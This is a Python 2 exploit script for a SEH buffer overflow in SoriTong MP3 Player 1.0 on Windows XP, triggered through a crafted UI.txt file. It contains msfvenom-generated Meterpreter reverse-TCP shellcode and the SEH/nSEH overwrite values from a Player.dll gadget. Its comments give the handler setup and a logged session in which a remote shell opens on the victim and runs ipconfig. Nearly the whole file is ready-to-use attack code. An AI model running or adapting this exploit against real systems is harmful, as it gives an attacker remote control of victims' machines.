#!/usr/bin/python2

#---------------------------------------------------------------------------------------------------#
# Exploit: SoriTong MP3 Player 1.0 UI.txt BOF (SEH)                                                 #
# OS: Windows XP Professional SP3 Build 2600                                                        #
# Architecture: x86                                                                                 #
#---------------------------------------------------------------------------------------------------#
# msfconsole -x "use exploit/multi/handler;\                                                        #
# set PAYLOAD windows/meterpreter/reverse_tcp;\                                                     #
# set LHOST 192.168.1.160;\                                                                         #
# set LPORT 4444;\                                                                                  #
# run"                                                                                              #
# [*] Using configured payload generic/shell_reverse_tcp                                            #
# PAYLOAD => windows/meterpreter/reverse_tcp                                                        #
# LHOST => 192.168.1.160                                                                            #
# LPORT => 4444                                                                                     #
# [*] Started reverse TCP handler on 192.168.1.160:4444                                             #
# [*] Sending stage (175174 bytes) to 192.168.1.82                                                  #
# [*] Meterpreter session 1 opened (192.168.1.160:4444 -> 192.168.1.82:1043 ) ...                   #
#                                                                                                   #
# meterpreter > shell                                                                               #
# Process 1040 created.                                                                             #
# Channel 1 created.                                                                                #
# Microsoft Windows XP [Version 5.1.2600]                                                           #
# (C) Copyright 1985-2001 Microsoft Corp.                                                           #
#                                                                                                   #
# C:\Program Files\SoriTong>ipconfig                                                                #
# ipconfig                                                                                          #
#                                                                                                   #
# Windows IP Configuration                                                                          #
#                                                                                                   #
#                                                                                                   #
# Ethernet adapter Local Area Connection:                                                           #
#                                                                                                   #
#         Connection-specific DNS Suffix  . :                                                       #
#         IP Address. . . . . . . . . . . . : 192.168.1.82                                          #
#         Subnet Mask . . . . . . . . . . . : 255.255.255.0                                         #
#         Default Gateway . . . . . . . . . : 192.168.1.1                                           #
#---------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------------------------------------------#
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.160 LPORT=4444 -f c -b '\x00\x0a\x0d' #
# x86/shikata_ga_nai succeeded with size 381 (iteration=0)                                          #
#---------------------------------------------------------------------------------------------------#

shellcode = ("\xd9\xc1\xbd\x82\xc3\x74\xe9\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x59\x31\x6a\x19\x03\x6a\x19\x83\xc2\x04\x60\x36\x88\x01\xeb"
"\xb9\x71\xd2\x93\x88\xa3\x5b\xb6\x8f\xc8\x0e\x08\xdb\x9d\xa2"
"\xe3\x89\x35\x30\x81\x05\x39\xf1\x2f\x70\x74\x02\x9e\xbc\xda"
"\xc0\x81\x40\x21\x15\x61\x78\xea\x68\x60\xbd\xbc\x07\x8d\x13"
"\x68\x63\x03\x84\x1d\x31\x9f\xa5\xf1\x3d\x9f\xdd\x74\x81\x6b"
"\x52\x76\xd2\x18\x32\x58\x59\x56\xdb\xc8\x5c\xb5\x5e\x21\x2a"
"\x05\x50\x4d\x9a\xfe\xa6\x3a\x1c\xd6\xf6\xfc\xb3\x17\x37\xf1"
"\xca\x50\xf0\xea\xb8\xaa\x02\x96\xba\x69\x78\x4c\x4e\x6d\xda"
"\x07\xe8\x49\xda\xc4\x6f\x1a\xd0\xa1\xe4\x44\xf5\x34\x28\xff"
"\x01\xbc\xcf\x2f\x80\x86\xeb\xeb\xc8\x5d\x95\xaa\xb4\x30\xaa"
"\xac\x11\xec\x0e\xa7\xb0\xfb\x2f\x48\x4b\x04\x72\xde\x87\xc9"
"\x8d\x1e\x80\x5a\xfd\x2c\x0f\xf1\x69\x1c\xd8\xdf\x6e\x15\xce"
"\xdf\xa1\x9d\x9f\x21\x42\xdd\xb6\xe5\x16\x8d\xa0\xcc\x16\x46"
"\x31\xf0\xc2\xf2\x3b\x66\x2d\xaa\x3d\xd6\xc5\xa8\x3d\x07\x4a"
"\x25\xdb\x77\x22\x65\x74\x38\x92\xc5\x24\xd0\xf8\xca\x1b\xc0"
"\x02\x01\x34\x6b\xed\xff\x6c\x04\x94\x5a\xe6\xb5\x59\x71\x82"
"\xf6\xd2\x73\x72\xb8\x12\xf6\x60\xad\x44\xf8\x78\x2e\xe1\xf8"
"\x12\x2a\xa3\xaf\x8a\x30\x92\x87\x14\xca\xf1\x94\x53\x34\x84"
"\xac\x28\x03\x12\x90\x46\x6c\xf2\x10\x97\x3a\x98\x10\xff\x9a"
"\xf8\x43\x1a\xe5\xd4\xf0\xb7\x70\xd7\xa0\x64\xd2\xbf\x4e\x52"
"\x14\x60\xb1\xb1\x26\x67\x4d\x47\x01\xc0\x25\xb7\x11\xf0\xb5"
"\xdd\x91\xa0\xdd\x2a\xbd\x4f\x2d\xd2\x14\x18\x25\x59\xf9\xea"
"\xd4\x5e\xd0\xab\x48\x5e\xd7\x77\x7b\x25\x98\x88\x7c\xda\xb0"
"\xec\x7d\xda\xbc\x12\x42\x0c\x85\x60\x85\x8c\xb2\x7b\xb0\xb1"
"\x93\x11\xba\xe6\xe4\x33")

#---------------------------------------------------------------------------------------------------#
# 0x100106fb : pop edi # pop esi # ret                                                              #
# {PAGE_EXECUTE_READ} [Player.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False            #
# v-1.0- (C:\Program Files\SoriTong\Player.dll)                                                     #
#---------------------------------------------------------------------------------------------------#

seh="\xfb\x06\x01\x10" 

# Short jump over 6 bytes
nseh="\xeb\x06\x90\x90"

# NOP padding
nop = "\x90"*(1000-len(shellcode))

payload = "A"*584 + nseh + seh + shellcode + nop

with open("UI.txt", 'w') as f:
    f.write(payload)
 
